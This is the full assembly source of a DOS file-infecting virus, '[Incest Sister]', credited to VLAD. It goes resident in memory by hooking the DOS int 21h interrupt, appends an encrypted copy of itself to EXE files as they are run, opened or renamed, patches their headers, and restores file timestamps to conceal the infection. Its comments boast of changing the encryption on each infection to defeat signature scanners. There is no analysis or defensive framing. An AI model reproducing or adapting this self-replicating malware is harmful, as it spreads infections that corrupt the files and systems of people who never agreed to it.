dummy           segment                                                       
assume cs:dummy,ds:data_seg,ss:stack_seg                                      
dumb    proc    far                                                           
dumdum:                                                                       
               mov     ax,4c00h                ;The dummy infectee.           
               int     21h                     ;When the virus finishes       
                                               ;it returns here.              
dumb    endp                                                                  
dummy           ends                                                          
                                                                              
                                                                              
                                                                              
stack_seg       segment stack                  ;Stack segment                 
       db        1000    dup (0)                                              
stack_seg       ends                                                          
                                                                              
data_seg        segment                        ;Another crappy segment of     
       db      'stuff'                         ;no use to anyone...           
data_seg        ends                                                          
                                                                              
                                                                              
code_seg        segment                                                       
assume cs:code_seg,ds:data_seg,ss:stack_seg                                   
main    proc    far                                                           
                                                                              
entry:                                                                        
                                                                              
       call    crap_ret                                ;Get IP                
                                                                              
return_here:                                   ;Where the ret will return.    
                                                                              
       mov     word ptr cs:[si+offset orig_sp],sp      ;Save the stack.       
       mov     word ptr cs:[si+offset orig_ss],ss                             
                                                                              
       mov     word ptr cs:[si+offset quit], 20cdh     ;Fuck all scanners.    
quit:                                                                         
                                                                              
       cli                                     ;Ints off while fucking with   
       mov     dx,cs                           ;the stack.                    
       mov     ss,dx                                                          
       mov     sp,si                                                          
       add     sp,offset stackend                                             
       sti                                                                    
                                                                              
       ;Run decryption                                                        
                                                                              
       mov     al,byte ptr cs:[si+encryptor]   ;Setup the encryption.         
       push    si                                                             
       add     si,offset enc_start                                            
                                                                              
       call    encrypt                                 ;Decrypt.              
                                                                              
       pop     si                                      ;Restore SI            
                                                                              
enc_start:                                     ;Start encrypting here.        
                                                                              
       ;do stuff                                                              
                                                                              
       push    ax                                                             
       push    bx                                                             
       push    cx                                                             
       push    dx                              ;Save everything.              
       push    ds                                                             
       push    es                                                             
       push    si                                                             
       push    di                                                             
                                                                              
       ;Residency check goes in here...                                       
                                                                              
       mov     ah,61h                         ;Sis!(ter)                      
       mov     di,'SI'                                                        
       mov     bx,'S'                                                         
       int     21h                                                            
                                                                              
       cmp     cx,'SI'                                                        
       jne     not_installed                                                  
       cmp     dx,'S'                                                         
       jne     not_installed                                                  
       jmp     jend                            ;Already in memory - exit.     
                                                                              
not_installed:                                                                
                                                                              
       xor     ax,ax                           ;Segment 0... where the        
       mov     es,ax                           ;interrupt table lurks...      
                                                                              
       mov     ax,word ptr es:[132]            ;Put int21 in i21...           
       mov     word ptr cs:[si+offset i21],ax                                 
       mov     word ptr cs:[si+offset int21_2],ax                             
       mov     ax,word ptr es:[134]                                           
       mov     word ptr cs:[si+offset i21 +2],ax                              
       mov     word ptr cs:[si+offset int21_2 + 2],ax                         
                                                                              
                                                                              
;Check for incest family marker here...                                       
                                                                              
       mov     ah,61h                         ;Sis!(ter)                      
       mov     di,'IN'                                                        
       int     21h                                                            
                                                                              
       cmp     di,'NI'                                                        
       jne     not_incest                                                     
                                                                              
       mov     word ptr cs:[si+offset int21_2],cx      ;Pass through the      
       mov     word ptr cs:[si+offset int21_2+2],dx    ;original int21h       
                                                       ;from another family   
                                                       ;member already        
                                                       ;resident.             
not_incest:                                                                   
                                                                              
;Make the Virus go TSR!                                                       
                                                                              
       push    cs                                                             
       pop     es                              ;ES=CS                         
                                                                              
       mov     ax,ds                                                          
       dec     ax                                                             
       mov     es,ax                           ;MCB segment.                  
       cmp     byte ptr es:[0],5ah             ;'Z'                           
       jne     jend                                                           
       sub     word ptr es:[3],120                                            
       sub     word ptr es:[12h],120           ;120*16 bytes less memory.     
                                                                              
       mov     ax,es:[12h]                     ;Make our virus last chain     
       mov     es,ax                                                          
       mov     byte ptr es:[0],5ah             ;Setup our own MCB             
       mov     word ptr es:[1],8               ;Owner=DOS                     
       mov     word ptr es:[3],1500            ;Segment size                  
       inc     ax                                                             
       mov     es,ax                                                          
       mov     di,offset entry                                                
       mov     cx,length                       ;virus size                    
       push    cs                                                             
       pop     ds                                                             
       push    si                                                             
       rep     movsb                           ;Move virus.                   
       pop     si                                                             
                                                                              
       mov     bx,es                           ;Save virus segment            
                                                                              
       xor     ax,ax                           ;segment of vector table       
       mov     es,ax                                                          
                                                                              
       mov     ax,offset infection             ;change vector table to point  
       cli                                                                    
       mov     word ptr es:[132],ax            ;to our virus...               
       mov     word ptr es:[134],bx                                           
       sti                                                                    
                                                                              
jend:                                                                         
                                                                              
       pop     di                                                             
       pop     si                                                             
       pop     es                                                             
       pop     ds                              ;Restore all.                  
       pop     dx                                                             
       pop     cx                                                             
       pop     bx                                                             
       pop     ax                                                             
                                                                              
       ;add es,10h                                                            
                                                                              
       mov     dx,es                           ;EXE starts at PSP+10h         
       add     dx,10h                                                         
                                                                              
       ;add original offset of cs in paragraphs.                              
                                                                              
       add     word ptr cs:[si+jump+2],dx                                     
                                                                              
       ;now you have your cs to jump to                                       
       ;move it where we want it then jump to it.                             
                                                                              
       cli                                                                    
                                                                              
       mov     sp,word ptr cs:[si+orig_sp]     ;Restore stack                 
       mov     ss,word ptr cs:[si+orig_ss]                                    
                                                                              
       sti                                                                    
       xor     dx,dx                                                          
       xor     si,si                                                          
                                                                              
       db      0eah                    ;JMPF                                  
                                                                              
       jump    dw      0                                                      
               dw      0                                                      
                                                                              
                                                                              
       ;###### Here is the Details ######                                     
                                                                              
Virus_Name      db      '[Incest Sister]',0                                   
Author          db      'by VLAD - Brisbane, OZ',0                            
                                                                              
                                                                              
                                                                              
infection       proc    far                                                   
                                                                              
       cmp     ah,4bh                  ;Execute.                              
       je      test_exe                                                       
       cmp     ah,43h                  ;Chmod.                                
       je      test_exe                                                       
       cmp     ah,56h                  ;Rename.                               
       je      test_exe                                                       
       cmp     ax,6c00h                ;Extended open.                        
       je      test_exe                                                       
       cmp     ah,3dh                  ;Normal open.                          
       je      test_exe                                                       
                                                                              
                                       ;Residency test.                       
       cmp     ah,61h                                                         
       jne     not_testing                                                    
       cmp     di,'SI'                                                        
       jne     chk4incest                                                     
       cmp     bx,'S'                                                         
       jne     not_testing                                                    
       mov     cx,'SI'                                                        
       mov     dx,'S'                  ;Return test parameters.               
                                                                              
       iret                                                                   
                                                                              
chk4incest:                                                                   
                                                                              
       cmp     di,'IN'                                                        
       jne     not_testing                                                    
       mov     di,'NI'                         ;Incest Marker...              
       mov     cx,word ptr cs:[int21_2]                                       
       mov     dx,word ptr cs:[int21_2 + 2]    ;Pass original int21h out.     
       iret                                                                   
                                                                              
not_testing:                                                                  
                                                                              
       jmp     far_tsr_end                                                    
                                                                              
test_exe:                                                                     
                                                                              
       push    ax                                                             
       push    bx                                                             
       push    cx                                                             
       push    dx                                                             
       push    ds                                                             
       push    es                                                             
       push    si                                                             
       push    di                                                             
                                                                              
       cmp     ah,6ch                          ;Extended open.                
       jne     no_fix_6c                                                      
       mov     dx,si                           ;Small alteration for 61h      
                                                                              
no_fix_6c:                                                                    
       cld                                     ;Clear Direction Flag.         
       mov     si,dx                           ;Filename being executed.      
       dec     si                                                             
find_ascii_z:                                                                 
       inc     si                                                             
       cmp     byte ptr ds:[si],0              ;Find end of ASCIIZ name.      
       jne     find_ascii_z                                                   
                                                                              
       sub     si,4                            ;Length of '.EXE'              
                                                                              
       cmp     word ptr ds:[si],'E.'                                          
       je      exe_found1                                                     
       jmp     f_pop_exit                                                     
                                                                              
exe_found1:                                                                   
                                                                              
       cmp     word ptr ds:[si+2],'EX'         ;Test for '.EXE'               
       je      exe_found2                                                     
                                                                              
really_crappy_pop_jump:                                                       
                                                                              
       jmp     f_pop_exit                      ;Cant jxx 127+ bytes so use    
                                               ;this...                       
                                                                              
exe_found2:                                                                   
                                                                              
       mov     ax,3d02h                        ;Open!                         
       call    int21h                                                         
                                                                              
       jc      really_crappy_pop_jump                                         
                                                                              
       mov     bx,ax                           ;File handle.                  
                                                                              
       xor     ax,ax                                                          
       mov     es,ax                                                          
       mov     ax,word ptr es:[144]                                           
       mov     word ptr cs:[i24],ax                                           
       mov     ax,word ptr es:[146]                                           
       mov     word ptr cs:[i24+2],ax          ;Save int24h                   
       mov     word ptr es:[144],offset int24h                                
       mov     es:[146],cs                     ;Cool handler!                 
                                                                              
       ;read in header                                                        
                                                                              
       push    cs                                                             
       pop     ds                              ;DS=CS                         
                                                                              
       mov     ax,5700h                                                       
       call    int21h                          ;Save the file date for        
                                               ;later use.                    
                                                                              
       mov     filetime,cx                     ;File date and Time.           
       mov     filedate,dx                                                    
                                                                              
       mov     ah,3fh                                                         
       mov     cx,1ah                                                         
       mov     dx,offset header                ;Read the header in here.      
       call    int21h                                                         
                                                                              
       mov     si,offset header                ;Index to the header.          
                                                                              
       cmp     word ptr [si+12h],'SI'          ;Our 'sister' marker.          
       jne     clean_file                                                     
                                                                              
       jmp     far_close_exit                                                 
                                                                              
clean_file:                                                                   
                                                                              
       mov     cx,word ptr [si]                ;MZ header.                    
       add     ch,cl                           ;Add M+Z = 167.                
       cmp     ch,167                                                         
       je      good_exe                                                       
                                                                              
       jmp     far_close_exit                                                 
                                                                              
       ;convert headersize to bytes                                           
                                                                              
good_exe:                                                                     
                                                                              
       mov     ax,word ptr [si+8]                                             
       mov     cl,4                                                           
       shl     ax,cl                           ;Mul by 16 - paragraphs        
                                                                              
       mov     word ptr hsize,ax               ;Header size in bytes.         
                                                                              
       ;save original cs & ip for later use                                   
                                                                              
       mov     ax,word ptr [si+14h]                                           
       mov     word ptr jump,ax                                               
       mov     ax,word ptr [si+16h]                                           
       mov     word ptr jump+2,ax                                             
                                                                              
       ;end of file                                                           
       mov     ax,4202h                        ;Go to EOF.                    
       xor     cx,cx                                                          
       xor     dx,dx                                                          
       call    int21h                                                         
                                                                              
       ;get file length                                                       
                                                                              
       ;convert length to paragraph/offset form                               
                                                                              
       sub     ax,word ptr hsize                                              
       sbb     dx,0                                                           
                                                                              
       mov     cx,10h                                                         
       div     cx                                                             
                                                                              
       ;write to header                                                       
                                                                              
       mov     word ptr [si+14h],dx            ;New IP/CS                     
       mov     word ptr [si+16h],ax                                           
                                                                              
       ;fix up encryption                                                     
                                                                              
       push    si                                                             
                                                                              
       mov     word ptr quit,8cfah             ;Fixup from our 'int 20h' bit  
                                                                              
       cmp     byte ptr encryptor,0ffh                                        
       jne     not_zero                                                       
       inc     byte ptr encryptor                                             
not_zero:                                                                     
       inc     byte ptr encryptor              ;Change the encryptor to fuck  
       mov     al,byte ptr encryptor           ;up all those signature        
                                               ;scanners...                   
       push    cs                                                             
       pop     es                                                             
                                                                              
       mov     si,offset entry                 ;Copy code to end of TSR       
       mov     di,offset stackend              ;so we can encrypt it.         
       mov     cx,length                       ;Virus Size.                   
       rep     movsb                           ;Move it!                      
                                                                              
       mov     si,offset stackend              ;Find the offset of            
       add     si,offset enc_start             ;the encryption start.         
                                                                              
       call    encrypt                         ;Encrypt it.                   
                                                                              
       pop     si                              ;Restore it.                   
                                                                              
       ;write virus to eof                                                    
                                                                              
       mov     ah,40h                                                         
       mov     cx,length                       ;Virus Size                    
       mov     dx,offset stackend                                             
       call    int21h                                                         
                                                                              
                                                                              
       jc      far_close_exit                                                 
                                                                              
       ;get new file length                                                   
                                                                              
       mov     ax,4202h                        ;EOF again.                    
       xor     cx,cx                                                          
       xor     dx,dx                                                          
       call    int21h                                                         
                                                                              
       ;work out number of pages and write to header                          
                                                                              
       push    dx                              ;Save them.                    
       push    ax                                                             
                                                                              
       mov     cx,512                          ;Page Size = 512.              
       div     cx                                                             
       inc     ax                                                             
                                                                              
       mov  word ptr [si+4],ax                 ; new file size                
                                                                              
       pop     ax                                                             
       pop     dx                                                             
                                                                              
       sub     ax,word ptr hsize                                              
       sbb     dx,0                                                           
       mov     cx,512                                                         
       div     cx                                                             
                                                                              
       mov  word ptr [si+2],dx                 ;Size of last page.            
                                                                              
       mov     ax,4200h                        ;Start of file.                
       xor     cx,cx                                                          
       xor     dx,dx                                                          
       call    int21h                                                         
                                                                              
       mov     word ptr [si+12h],'SI'          ;Put Marker into header.       
                                                                              
       mov     ah,40h                          ;Write header.                 
       mov     dx,offset header                                               
       mov     cx,1ah                                                         
       call    int21h                                                         
                                                                              
       mov     ax,5701h                        ;Restore file time.            
       mov     cx,filetime                                                    
       mov     dx,filedate                                                    
       call    int21h                                                         
                                                                              
far_close_Exit:                                                               
                                                                              
       mov     ah,3eh                          ;Close file.                   
       call    int21h                                                         
                                                                              
       xor     ax,ax                                                          
       mov     es,ax                           ;Interrupt vector table at     
       mov     ax,word ptr cs:[i24]            ;Segment 0.                    
       mov     es:[144],ax                                                    
       mov     ax,word ptr cs:[i24+2]                                         
       mov     es:[146],ax                     ;Reset int 24h                 
                                                                              
f_pop_exit:                                                                   
                                                                              
       pop     di                                                             
       pop     si                                                             
       pop     es                                                             
       pop     ds                                                             
       pop     dx                              ;Restore everything.           
       pop     cx                                                             
       pop     bx                                                             
       pop     ax                                                             
                                                                              
far_tsr_end:                                                                  
      ; jmp     dword ptr cs:[i21]                                            
       db 0eah                                 ;Self modifying code here.     
       i21     dd      0                                                      
                                                                              
       hsize           dw      0               ;Header size in bytes.         
       filedate        dw      0               ;File date.                    
       filetime        dw      0               ;File time.                    
                                                                              
int24h  proc    near    ;Stops embarassing error messages on write protected  
                        ;diskettes...                                         
                                                                              
               mov     al,3                                                   
               iret                                                           
int24h  endp                                                                  
                                                                              
               i24     dd      0               ;Original int24h               
                                                                              
                                                                              
int21h  proc    near                            ;False int21h                 
                                                                              
       pushf                                                                  
       db      9ah                             ;'Call far ptr' opcode.        
       int21_2 dd      0                       ;Save second int 21h here...   
enc_end:                                                                      
       ret                                                                    
                                                                              
int21h  endp                                                                  
                                                                              
encrypt proc    near                                                          
                                                                              
;       SI = offset of bit to be encrypted.                                   
;       AL = encryptor.                                                       
                                                                              
       push    cx                                                             
                                                                              
       mov     cx,offset enc_end - offset enc_start                           
                                                                              
enc_loop:                                                                     
                                                                              
       xor     byte ptr cs:[si],al                                            
       inc     si                                                             
       ror     al,1                                                           
       neg     al                                                             
       loop    enc_loop                                                       
                                                                              
       pop     cx                                                             
                                                                              
       ret                                                                    
                                                                              
encrypt endp                                                                  
                                                                              
       encryptor       db      0                                              
                                                                              
       orig_sp dw      0                                                      
       orig_ss dw      0                                                      
                                                                              
crap_ret        proc    near           ;Crappy 'Ret' routine to get IP.       
       mov     bp,sp                                                          
       mov     si,word ptr ss:[bp]     ;SS:SP = IP                            
       sub     si,offset return_here                                          
       xor     bp,bp                                                          
       ret                                                                    
crap_ret        endp                                                          
                                                                              
                                                                              
;Storage for the EXE header.                                                  
                                                                              
header:                                                                       
       db 1ah dup (0)                                                         
                                                                              
;The temporary stack.                                                         
                                                                              
stackseg  db 100 dup (0)                                                      
stackend  db 0                                                                
                                                                              
;Equ's!                                                                       
                                                                              
length equ offset header                                                      
                                                                              
infection       endp                                                          
main    endp                                                                  
code_seg        ends                                                          
        end                                                                   
